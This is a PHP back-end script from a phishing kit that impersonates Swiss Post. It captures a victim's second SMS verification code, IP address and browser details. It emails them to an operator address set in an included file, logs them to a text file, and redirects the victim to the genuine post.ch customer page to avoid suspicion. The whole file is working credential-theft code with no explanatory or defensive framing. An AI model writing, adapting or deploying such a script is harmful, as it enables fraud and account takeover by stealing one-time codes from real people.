<?php
require_once('04-amassuo.php');
$IP = getenv("REMOTE_ADDR");
$message = "--++-----[ 💎 SMS2  💎  ]-----++--\n";
$message .= " [ SMS2 ] : [  ".$_POST['sms2']." ] \n";
$message .= "-------------- IP Infos ------------\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- 04-amassuo ----------------------\n";
$sender = "SMS2 Switzerland Post";
$subject = "SMS2 Die Post [ " . $IP . " ] ";
$email = "".$EX445093_REMOT."";
_mail($email,$subject,$message);
    $text = fopen('../mlafta.txt', 'a');
fwrite($text, $message);

header("Location: https://www.post.ch/de/kundencenter/onlinedienste#t=AllOSTab&sort=%40servicez32xname%20ascending");
?>